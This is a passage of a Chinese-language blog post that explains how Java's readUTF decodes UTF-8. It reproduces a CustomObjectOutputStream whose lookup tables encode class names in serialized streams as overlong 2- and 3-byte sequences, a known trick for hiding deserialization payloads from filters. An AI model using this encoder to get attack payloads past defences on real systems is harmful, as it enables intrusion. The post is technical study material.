class="hljs-keyword">break</span>;<br><br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">12</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">13</span>:  <span class="hljs-comment">// 2 byte format: 110xxxxx 10xxxxxx</span><br>                            b2 = buf[pos++];<br>                            <span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                            &#125;<br>                            cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x1F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>                                                   ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br>                            <span class="hljs-keyword">break</span>;<br><br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">14</span>:  <span class="hljs-comment">// 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx</span><br>                            b3 = buf[pos + <span class="hljs-number">1</span>];<br>                            b2 = buf[pos + <span class="hljs-number">0</span>];<br>                            pos += <span class="hljs-number">2</span>;<br>                            <span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span> || (b3 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                            &#125;<br>                            cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x0F</span>) &lt;&lt; <span class="hljs-number">12</span>) |<br>                                                   ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>                                                   ((b3 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br>                            <span class="hljs-keyword">break</span>;<br><br>                        <span class="hljs-keyword">default</span>:  <span class="hljs-comment">// 10xx xxxx, 1111 xxxx</span><br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (ArrayIndexOutOfBoundsException ex) &#123;<br>                outOfBounds = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> (outOfBounds || (pos - start) &gt; utflen) &#123;<br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                     * Fix for 4450867: if a malformed utf char causes the</span><br><span class="hljs-comment">                     * conversion loop to scan past the expected end of the utf</span><br><span class="hljs-comment">                     * string, only consume the expected number of utf bytes.</span><br><span class="hljs-comment">                     */</span><br>                    pos = start + (<span class="hljs-type">int</span>) utflen;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                &#125;<br>            &#125;<br><br>            sbuf.append(cbuf, <span class="hljs-number">0</span>, cpos);<br>            <span class="hljs-keyword">return</span> pos - start;<br>        &#125;<br></code></pre></td></tr></table></figure><p>里面分别对1字节、2字节、3字节的形式进行了处理，对字节格式的判断是通过b1的高四位来确定的</p><p><strong>1字节处理：</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1 byte format: 0xxxxxxx</span><br>cbuf[cpos++] = (<span class="hljs-type">char</span>) b1;<br></code></pre></td></tr></table></figure><p>这里的处理很简单，直接将b1字节值转换成字符</p><p><strong>2字节处理：</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 2 byte format: 110xxxxx 10xxxxxx</span><br>b2 = buf[pos++];<br><span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>     <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>&#125;<br>cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x1F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>        ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>检查第二个字节是否符合格式，然后合并两个字节生成字符</p><p>首先根据b1高四位为12或者13，知道b1的前四位只能为1100或1101，也就是前三位固定为110；b2与上0xc0一定要为0x80，所以b2前两位一定为10；</p><p>然后在转换字符的时候，由b1字节的最后两位和b2的后六位构成字符的字节，也就是unicode的代码点，最后读取出我们的字符</p><p>b1&amp;0x1F的作用就是去除前缀110，同样的b2&amp;0x3F的作用就是去除前缀10</p><blockquote><p>这里有个比较重要的地方，就是int类型的移位</p><p>因为一开始习惯性的认为超出8位会被截断，后来一想如果只有8位怎么表示unicode字符这么大的代码点呢</p><p>后来就知道了int类型因为是32位，他是按照32位来移位的，所以上面的移位操作并不会发生截断，也就是比如：00010100左移五位是10100 00000，这是按照32位来的，这样上面的合并操作看起来就合理了</p></blockquote><p>如果想要用两个字节表示一个字符比如o的话，<strong>o的二进制为01101111</strong>，我们可以根据要求将其扩充成两字节UTF-8的编码</p><p>根据上面可知，b1保留了自己的中间3位，形式为 110+三位+要合并的两位，b2就是b1的后两位加上自己的后6位，所以这六位很容易知道是固定的，b2的前缀一定为10，所以b2就是固定的没办法变化</p><p>然后我们想转字符的话，由于字母的Unicode编码是0-127，所以第一位字节肯定为0，如果我们要得到这种形式，那么b1的中间3位一定得为0也是固定的，合并的两位就是我们o字符的前两位</p><p>所以o转换成能够解析的二进制形式就为：11000001 10101111，固定为\xC1\xAF</p><p><strong>3字节处理：</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx</span><br>b3 = buf[pos + <span class="hljs-number">1</span>];<br>b2 = buf[pos + <span class="hljs-number">0</span>];<br>pos += <span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span> || (b3 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>&#125;<br>cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x0F</span>) &lt;&lt; <span class="hljs-number">12</span>) |<br>         ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>         ((b3 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>同样检查后两个字节然后合并生成字符，有前面分析2字节处理的基础，分析3字节的处理也就简单很多了</p><p>首先b1右移4位等于14，即前缀一定是1110，然后就是判断b2、b3前缀是否为10</p><p>合并的逻辑就是：b1去除前缀左移12位，b2去除前缀左移6位，b3去除前缀不移位</p><p>然后就是想要三字节合并为一个ascii字符有什么要求了</p><ul><li>b1：为前缀1110 + 0000，固定了</li><li>b3：没有移位也是固定的，就是10+我们要转化的字符的后六位</li><li>b2：100000 + 字符前两位</li></ul><p>例如用b1，b2，b3表示j字符：11100000 10000001 10101010</p><h2 id="转换为overlong-encoding"><a href="#转换为Overlong-Encoding" class="headerlink" title="转换为Overlong Encoding"></a>转换为Overlong Encoding</h2><p>那么应该对类进行转换呢，我们可以想到直接暴力将所有序列化字节流进行替换，但会破坏一些非类名的信息，可能导致反序列化失败，<a href="https://xz.aliyun.com/u/81008"><strong>lzstar</strong></a>师傅的文章中给出了方法，我们可以继承ObjectOutputStream重写里面的序列化逻辑，更准确的说，是重写序列化类名的方法</p><p>师傅的重写思路就是继承ObjectOutputStream，重写writeClassDescriptor方法，在writeClassDescriptor方法中实现desc.writeNonProxy(this)方法的逻辑和将类名Overlong Encoding的逻辑，具体操作的话就是直接将desc.writeNonProxy(this)方法的逻辑复制进去，缺少的属性可以通过反射获取，缺少的方法可以通过反射调用，之后在里面加上Overlong Encoding的逻辑就可以了。</p><p>直接贴师傅的代码了这里，膜拜佬orz</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 参考p神：https://mp.weixin.qq.com/s/fcuKNfLXiFxWrIYQPq7OCg</span><br><span class="hljs-comment"> * 参考1ue：https://t.zsxq.com/17LkqCzk8</span><br><span class="hljs-comment"> * 实现：参考 OObjectOutputStream# protected void writeClassDescriptor(ObjectStreamClass desc)方法</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomObjectOutputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectOutputStream</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CustomObjectOutputStream</span><span class="hljs-params">(OutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(out);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> HashMap&lt;Character, <span class="hljs-type">int</span>[]&gt; map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;Character,<span class="hljs-type">int</span>[]&gt; bytesMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xbb</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaa</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xab</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xac</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xad</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb0</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xba</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x81</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x82</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x83</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x84</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x85</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x86</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x87</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x88</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x89</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8a</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8c</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8e</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8f</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x90</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x91</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x92</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x93</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x94</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x95</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x96</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x97</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x98</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x99</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9a</span>&#125;);<br><br><br>        bytesMap.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xbb</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x81</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x82</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x83</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x84</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x85</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x86</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x87</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x88</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x89</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8c</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8e</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8f</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x90</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x91</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x92</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x93</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x94</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x95</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x96</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x97</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x98</span>&#125;);<br>        